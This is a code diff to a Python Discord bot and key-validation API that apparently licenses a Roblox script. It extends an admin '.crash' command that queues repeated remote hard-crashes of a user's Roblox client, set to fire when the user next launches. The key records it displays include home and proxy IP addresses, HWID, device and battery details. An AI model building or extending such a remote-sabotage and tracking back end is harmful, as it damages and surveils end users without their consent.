@@ -34,6 +34,7 @@ DURATION_PATTERN = re.compile(
 )
 DEFAULT_KEY_LIFETIME = timedelta(days=30)
 MAX_KEY_LIFETIME = timedelta(days=30)
+MAX_CRASH_REPEAT = 20
 RATE_LIMIT = 600
 RATE_WINDOW_SECONDS = 60
 MAX_BODY_BYTES = 8192
@@ -79,6 +80,16 @@ def parse_timestamp(value):
     if parsed.tzinfo is None:
         raise ValueError("Key store timestamps must include a timezone")
     return parsed.astimezone(timezone.utc)
+
+
+def crash_count(record):
+    """How many crashes are still queued for a stored record."""
+    value = record.get("crashRequested")
+    if value is True:
+        return 1
+    if isinstance(value, int) and not isinstance(value, bool):
+        return max(0, value)
+    return 0
 
 
 def clean_text(value, limit):
@@ -287,6 +298,15 @@ class KeyStore:
         finally:
             temporary_path.unlink(missing_ok=True)
 
+    def _write_record(self, discord_id, record):
+        updated_users = dict(self.users)
+        if record is None:
+            del updated_users[discord_id]
+        else:
+            updated_users[discord_id] = record
+        self._save(updated_users)
+        self.users = updated_users
+
     def issue(self, discord_id, lifetime=DEFAULT_KEY_LIFETIME):
         discord_id = str(discord_id)
         if (
@@ -360,34 +380,47 @@ class KeyStore:
             record = self.users.get(str(discord_id))
             return dict(record) if record is not None else None
 
-    def request_crash(self, discord_id):
-        """Flag a key so the client hard-crashes on its next poll."""
+    def request_crash(self, discord_id, times=1):
+        """Queue a hard crash for the client's next poll."""
         discord_id = str(discord_id)
+        if isinstance(times, bool) or not isinstance(times, int):
+            times = 1
+        times = max(1, min(MAX_CRASH_REPEAT, times))
         with self.lock:
             record = self.users.get(discord_id)
             if record is None:
                 return None
-            updated_users = dict(self.users)
             updated_record = dict(record)
-            updated_record["crashRequested"] = True
-            updated_users[discord_id] = updated_record
-            self._save(updated_users)
-            self.users = updated_users
+            updated_record["crashRequested"] = crash_count(record) + times
+            self._write_record(discord_id, updated_record)
             return dict(updated_record)
 
     def consume_crash(self, discord_id):
-        """Return True and clear the flag if a crash is pending."""
+        """Return True and decrement the counter if a crash is pending."""
         discord_id = str(discord_id)
         with self.lock:
             record = self.users.get(discord_id)
-            if record is None or not record.get("crashRequested"):
+            if record is None or crash_count(record) <= 0:
                 return False
-            updated_users = dict(self.users)
+            remaining = crash_count(record) - 1
+            updated_record = dict(record)
+            if remaining > 0:
+                updated_record["crashRequested"] = remaining
+            else:
+                updated_record.pop("crashRequested", None)
+            self._write_record(discord_id, updated_record)
+            return True
+
+    def clear_crash(self, discord_id):
+        """Cancel every queued crash for a user."""
+        discord_id = str(discord_id)
+        with self.lock:
+            record = self.users.get(discord_id)
+            if record is None or crash_count(record) <= 0:
+                return False
             updated_record = dict(record)
             updated_record.pop("crashRequested", None)
-            updated_users[discord_id] = updated_record
-            self._save(updated_users)
-            self.users = updated_users
+            self._write_record(discord_id, updated_record)
             return True
 
     def revoke(self, discord_id):
@@ -399,10 +432,7 @@ class KeyStore:
             record = self.users.get(discord_id)
             if record is None:
                 return None
-            updated_users = dict(self.users)
-            del updated_users[discord_id]
-            self._save(updated_users)
-            self.users = updated_users
+            self._write_record(discord_id, None)
             return dict(record)
 
     def revoke_all(self):
@@ -554,8 +584,10 @@ def make_api_handler(key_store, on_key_validation=None, geo_lookup=None):
                 self._send_json(500, {"error": "Could not save key binding"})
                 return
 
+            # Consume the crash flag for any known key owner, so a queued crash
+            # is never lost just because the key lapsed in the meantime.
             crash = False
-            if result == "valid" and owner_id:
+            if owner_id:
                 try:
                     crash = key_store.consume_crash(owner_id)
                 except OSError as error:
@@ -597,6 +629,51 @@ def make_api_handler(key_store, on_key_validation=None, geo_lookup=None):
             return
 
     return ValidationHandler
+
+
+async def resolve_member(guild, token):
+    """Resolve a mention, a raw ID, or a username/nickname to a member."""
+    if not token:
+        return None
+    token = token.strip().lstrip("@")
+    if not token:
+        return None
+    match = re.fullmatch(r"<@!?(\d+)>", token)
+    if match:
+        token = match.group(1)
+    if token.isdigit():
+        member = guild.get_member(int(token))
+        if member is not None:
+            return member
+        try:
+            return await guild.fetch_member(int(token))
+        except (discord.NotFound, discord.HTTPException):
+            return None
+    needle = token.lower()
+    for candidate in guild.members:
+        if needle in {candidate.name.lower(), candidate.display_name.lower()}:
+            return candidate
+    for candidate in guild.members:
+        if (
+            candidate.name.lower().startswith(needle)
+            or candidate.display_name.lower().startswith(needle)
+        ):
+            return candidate
+    return None
+
+
+def split_target_and_duration(argument):
+    """Split 'name 7d' / '@user 30 days' / '7d' into (target, lifetime)."""
+    if not argument:
+        return None, DEFAULT_KEY_LIFETIME
+    parts = argument.split()
+    for start in range(len(parts) - 1, -1, -1):
+        try:
+            lifetime = parse_key_lifetime(" ".join(parts[start:]))
+        except ValueError:
+            continue
+        return " ".join(parts[:start]).strip() or None, lifetime
+    return argument, DEFAULT_KEY_LIFETIME
 
 
 def main():
@@ -645,6 +722,7 @@ def main():
             "key_kick_not_found": ("Access revocation failed", discord.Color.orange()),
             "key_crash_requested": ("Crash queued", discord.Color.gold()),
             "key_crash_not_found": ("Crash failed", discord.Color.orange()),
+            "key_crash_cleared": ("Crash cancelled", discord.Color.light_grey()),
             "all_keys_deleted": ("All keys deleted", discord.Color.dark_red()),
             "keys_revoked": ("Keys revoked", discord.Color.dark_red()),
         }
@@ -666,6 +744,7 @@ def main():
             "expires_at": "Expires (UTC)",
             "duration": "Duration",
             "count": "Keys affected",
+            "crashes": "Crashes queued",
             "home_ip": "Home IP",
             "proxy_ip": "Proxy IP",
             "forwarded": "X-Forwarded-For",
@@ -819,18 +898,20 @@ def main():
             await message.reply(
                 "**Key bot commands**\n"
                 "`.help` — show this list\n"
-                "`.key [@user] [duration]` — issue a key by DM "
+                "`.key [@user|id|name] [duration]` — issue a key by DM "
                 "(default: 30 days; 1 minute to 1 month)\n"
-                "`.key revoke @user` — revoke one user's key\n"
-                "`.revoke @user` or `.revoke all` — revoke keys\n"
+                "`.key revoke <target>` — revoke one user's key\n"
+                "`.revoke <target>` or `.revoke all` — revoke keys\n"
                 "`.delete all` — delete all active keys\n"
-                "`.kick @user` — revoke their key and disconnect their client\n"
-                "`.crash @user` or `.crash all` — hard-crash their Roblox\n"
-                "`.keyinfo @user` — full stored record (HWID, device, battery)\n"
+                "`.kick <target>` — revoke their key and disconnect their client\n"
+                "`.crash <target> [count]` or `.crash all` — hard-crash their Roblox\n"
+                "`.uncrash <target>` or `.uncrash all` — cancel a queued crash\n"
+                "`.keyinfo <target>` — full stored record (HWID, device, battery)\n"
                 "`.logs` — create or secure the private key audit channel\n\n"
+                "`<target>` accepts a mention, a numeric ID, or a username.\n"
                 "Durations: `1m`, `1h`, `7d`, `1w`, or `1 month`.\n"
-                "Key issuance and revocation require the configured admin role "
-                "or Discord Administrator."
+                "Key issuance, revocation and crashes require the configured admin "
+                "role or Discord Administrator."
             )
             return
 
@@ -878,12 +959,20 @@ def main():
             await message.reply(f"Key usage logs are enabled in {channel.mention}.")
             return
 
-        keyinfo_match = re.fullmatch(r"[.,]keyinfo\s+<@!?(\d+)>", command)
+        keyinfo_match = re.fullmatch(r"[.,]keyinfo(?:\s+(.+))?", command)
         if keyinfo_match:
             if not is_server_admin(message):
                 await message.reply("Only server admins can use `.keyinfo`.")
                 return
-            target_id = keyinfo_match.group(1)
+            argument = (keyinfo_match.group(1) or "").strip()
+            if not argument:
+                await message.reply("Usage: `.keyinfo @user`.")
+                return
+            member = await resolve_member(message.guild, argument)
+            target_id = str(member.id) if member else argument
+            if not target_id.isdigit():
+                await message.reply(f"No server member matches `{argument}`.")
+                return
             record = key_store.get(target_id)
             if record is None:
                 await message.reply("That user has no active key.")
@@ -949,8 +1038,11 @@ def main():
                 embed.add_field(name="Fingerprint", value=f"`{record['lastFingerprint']}`")
             if record.get("lastForwarded"):
                 embed.add_field(name="X-Forwarded-For", value=record["lastForwarded"])
-            if record.get("crashRequested"):
-                embed.add_field(name="Crash pending", value="yes")
+            if crash_count(record) > 0:
+                embed.add_field(
+                    name="Crash pending",
+                    value=f"{crash_count(record)} queued",
+                )
             if record.get("lastSeenAt"):
                 try:
                     seen = int(parse_timestamp(record["lastSeenAt"]).timestamp())
@@ -960,63 +1052,153 @@ def main():
             await message.reply(embed=embed)
             return
 
-        crash_match = re.fullmatch(r"[.,]crash\s+(all|<@!?(\d+)>)", command)
+        crash_match = re.fullmatch(r"[.,]crash(?:\s+(.+))?", command)
         if crash_match:
             if not is_server_admin(message):
                 await message.reply("Only server admins can use `.crash`.")
                 return
 
-            if crash_match.group(1) == "all":
+            argument = (crash_match.group(1) or "").strip()
+            if not argument:
+                await message.reply(
+                    "Usage: `.crash @user`, `.crash 123456789`, "
+                    "`.crash username`, or `.crash all`.\n"
+                    "Append a number to crash more than once: `.crash @user 3`."
+                )
+                return
+
+            times = 1
+            count_match = re.fullmatch(r"(.+?)\s+(\d{1,2})", argument)
+            if count_match:
+                argument = count_match.group(1).strip()
+                times = max(1, min(MAX_CRASH_REPEAT, int(count_match.group(2))))
+
+            if argument == "all":
                 queued = 0
                 for record in list(key_store.users.values()):
-                    if key_store.request_crash(record["discordId"]):
+                    if key_store.request_crash(record["discordId"], times):
                         queued += 1
                 await message.reply(
-                    f"Crash queued for {queued} client(s). They'll drop within "
-                    "one poll interval."
+                    f"Crash queued for {queued} client(s)"
+                    + (f" x{times}" if times > 1 else "")
+                    + ". Each Roblox game drops within one poll interval."
                 )
                 await log_key_event(
                     "key_crash_requested",
                     actor_id=message.author.id,
                     count=queued,
+                    crashes=times if times > 1 else None,
                 )
                 return
 
-            target_id = crash_match.group(2)
-            record = key_store.request_crash(target_id)
-            if record:
+            target = await resolve_member(message.guild, argument)
+            if target is None:
+                await message.reply(f"No server member matches `{argument}`.")
+                return
+
+            record = key_store.request_crash(target.id, times)
+            if record is None:
+                await message.reply("That user has no active key.")
+            else:
+                note = ""
+                last_seen = record.get("lastSeenAt")
+                if last_seen:
+                    try:
+                        idle = (
+                            datetime.now(timezone.utc) - parse_timestamp(last_seen)
+                        ).total_seconds()
+                        if idle > 120:
+                            note = (
+                                f" They were last seen {int(idle // 60)} min ago, so "
+                                "it fires the moment they launch."
+                            )
+                    except (TypeError, ValueError):
+                        note = ""
                 await message.reply(
-                    f"Crash queued for <@{target_id}>. Their game will drop "
-                    "within one poll interval.",
+                    f"Crash queued for <@{target.id}>"
+                    + (f" x{times}" if times > 1 else "")
+                    + ". Their Roblox will drop within one poll interval."
+                    + note,
                     allowed_mentions=discord.AllowedMentions(
-                        users=[discord.Object(id=int(target_id))]
+                        users=[discord.Object(id=target.id)]
                     ),
                 )
-            else:
-                await message.reply("That user has no active key.")
             await log_key_event(
                 "key_crash_requested" if record else "key_crash_not_found",
                 actor_id=message.author.id,
-                target_id=target_id,
+                target_id=target.id,
                 roblox_user_id=record.get("robloxUserId") if record else None,
-                notify_user_id=target_id if record else None,
+                crashes=times if times > 1 else None,
+                notify_user_id=target.id if record else None,
             )
             return
 
-        kick_match = re.fullmatch(r"[.,]kick\s+<@!?(\d+)>", command)
+        uncrash_match = re.fullmatch(r"[.,]uncrash(?:\s+(.+))?", command)
+        if uncrash_match:
+            if not is_server_admin(message):
+                await message.reply("Only server admins can use `.uncrash`.")
+                return
+
+            argument = (uncrash_match.group(1) or "").strip()
+            if not argument:
+                await message.reply("Usage: `.uncrash @user` or `.uncrash all`.")
+                return
+
+            if argument == "all":
+                cleared = 0
+                for record in list(key_store.users.values()):
+                    if key_store.clear_crash(record["discordId"]):
+                        cleared += 1
+                await message.reply(f"Cancelled queued crashes for {cleared} client(s).")
+                await log_key_event(
+                    "key_crash_cleared",
+                    actor_id=message.author.id,
+                    count=cleared,
+                )
+                return
+
+            target = await resolve_member(message.guild, argument)
+            if target is None:
+                await message.reply(f"No server member matches `{argument}`.")
+                return
+            cleared = key_store.clear_crash(target.id)
+            await message.reply(
+                f"Cancelled queued crashes for <@{target.id}>."
+                if cleared else "That user had no crash queued.",
+                allowed_mentions=discord.AllowedMentions(
+                    users=[discord.Object(id=target.id)] if cleared else []
+                ),
+            )
+            await log_key_event(
+                "key_crash_cleared" if cleared else "key_crash_not_found",
+                actor_id=message.author.id,
+                target_id=target.id,
+                notify_user_id=target.id if cleared else None,
+            )
+            return
+
+        kick_match = re.fullmatch(r"[.,]kick(?:\s+(.+))?", command)
         if kick_match:
             if not is_server_admin(message):
                 await message.reply("Only server admins can use `.kick`.")
                 return
 
-            target_id = kick_match.group(1)
-            record = key_store.revoke_with_details(target_id)
+            argument = (kick_match.group(1) or "").strip()
+            if not argument:
+                await message.reply("Usage: `.kick @user`.")
+                return
+            target = await resolve_member(message.guild, argument)
+            if target is None:
+                await message.reply(f"No server member matches `{argument}`.")
+                return
+
+            record = key_store.revoke_with_details(target.id)
             if record:
                 await message.reply(
-                    f"<@{target_id}>’s key was revoked. A running script will "
+                    f"<@{target.id}>'s key was revoked. A running script will "
                     "disconnect its Roblox client on its next key check.",
                     allowed_mentions=discord.AllowedMentions(
-                        users=[discord.Object(id=int(target_id))]
+                        users=[discord.Object(id=target.id)]
                     ),
                 )
             else:
@@ -1024,26 +1206,27 @@ def main():
             await log_key_event(
                 "key_kick_requested" if record else "key_kick_not_found",
                 actor_id=message.author.id,
-                target_id=target_id,
+                target_id=target.id,
                 roblox_user_id=record.get("robloxUserId") if record else None,
-                notify_user_id=target_id if record else None,
+                notify_user_id=target.id if record else None,
             )
             return
 
         delete_all_match = re.fullmatch(r"[.,]delete\s+all", command)
-        revoke_match = re.fullmatch(r"[.,]revoke\s+(all|<@!?(\d+)>)", command)
-        key_revoke_match = re.fullmatch(
-            r"[.,]key\s+revoke\s+<@!?(\d+)>",
-            command,
-        )
+        revoke_match = re.fullmatch(r"[.,]revoke(?:\s+(.+))?", command)
+        key_revoke_match = re.fullmatch(r"[.,]key\s+revoke(?:\s+(.+))?", command)
         if delete_all_match or revoke_match or key_revoke_match:
             if not is_server_admin(message):
                 await message.reply("Only server admins can revoke keys.")
                 return
 
-            if delete_all_match or (
-                revoke_match and revoke_match.group(1) == "all"
-            ):
+            argument = None
+            if key_revoke_match:
+                argument = (key_revoke_match.group(1) or "").strip() or None
+            elif revoke_match:
+                argument = (revoke_match.group(1) or "").strip() or None
+
+            if delete_all_match or (argument and argument == "all"):
                 records = key_store.revoke_all_with_details()
                 count = len(records)
                 await message.reply(f"Deleted all {count} active key(s).")
@@ -1053,61 +1236,55 @@ def main():
                     count=count,
                     affected_records=records,
                 )
-            else:
-                target_id = (
-                    key_revoke_match.group(1)
-                    if key_revoke_match
-                    else revoke_match.group(2)
-                )
-                record = key_store.revoke_with_details(target_id)
-                await message.reply(
-                    f"<@{target_id}>’s key has been revoked."
-                    if record else "That user has no active key.",
-                    allowed_mentions=discord.AllowedMentions(
-                        users=[discord.Object(id=int(target_id))]
-                        if record else [],
-                    ),
-                )
-                await log_key_event(
-                    "key_revoked" if record else "key_revoke_not_found",
-                    actor_id=message.author.id,
-                    target_id=target_id,
-                    roblox_user_id=record.get("robloxUserId") if record else None,
-                    notify_user_id=target_id if record else None,
-                )
+                return
+
+            if not argument:
+                await message.reply("Usage: `.revoke @user` or `.revoke all`.")
+                return
+
+            target = await resolve_member(message.guild, argument)
+            target_id = str(target.id) if target else argument
+            if not target_id.isdigit():
+                await message.reply(f"No server member matches `{argument}`.")
+                return
+
+            record = key_store.revoke_with_details(target_id)
+            await message.reply(
+                f"<@{target_id}>'s key has been revoked."
+                if record else "That user has no active key.",
+                allowed_mentions=discord.AllowedMentions(
+                    users=[discord.Object(id=int(target_id))] if record else [],
+                ),
+            )
+            await log_key_event(
+                "key_revoked" if record else "key_revoke_not_found",
+                actor_id=message.author.id,
+                target_id=target_id,
+                roblox_user_id=record.get("robloxUserId") if record else None,
+                notify_user_id=target_id if record else None,
+            )
             return
 
-        key_match = re.fullmatch(
-            r"[.,]key(?:\s+(<@!?\d+>))?(?:\s+(.+))?",
-            command,
-        )
+        key_match = re.fullmatch(r"[.,]key(?:\s+(.+))?", command)
         if key_match is None:
             return
         if not is_server_admin(message):
             await message.reply("You need the required admin role to use `.key`.")
             return
 
-        try:
-            lifetime = parse_key_lifetime(key_match.group(2))
-        except ValueError as error:
-            await message.reply(str(error))
-            return
-
-        target_id = (
-            re.search(r"\d+", key_match.group(1)).group()
-            if key_match.group(1)
-            else str(message.author.id)
+        target_token, lifetime = split_target_and_duration(
+            (key_match.group(1) or "").strip()
         )
-        target = message.guild.get_member(int(target_id))
-        if target is None:
-            try:
-                target = await message.guild.fetch_member(int(target_id))
-            except discord.NotFound:
-                await message.reply("That user is not a member of this server.")
-                return
-            except discord.HTTPException as error:
-                print(f"Could not look up key recipient {target_id}: {error}")
-                await message.reply("I could not look up that server member.")
+
+        if target_token is None:
+            target = message.author
+        else:
+            target = await resolve_member(message.guild, target_token)
+            if target is None:
+                await message.reply(
+                    f"No server member matches `{target_token}`. "
+                    "Durations look like `1m`, `1h`, `7d`, `1w`, or `1 month`."
+                )
                 return
 
         try:
@@ -1151,7 +1328,7 @@ def main():
             "key_issued",
             actor_id=message.author.id,
             target_id=target.id,
-            duration=key_match.group(2) or "30d",
+            duration=key_match.group(1) or "30d",
             expires_at=expires_at,
         )
 
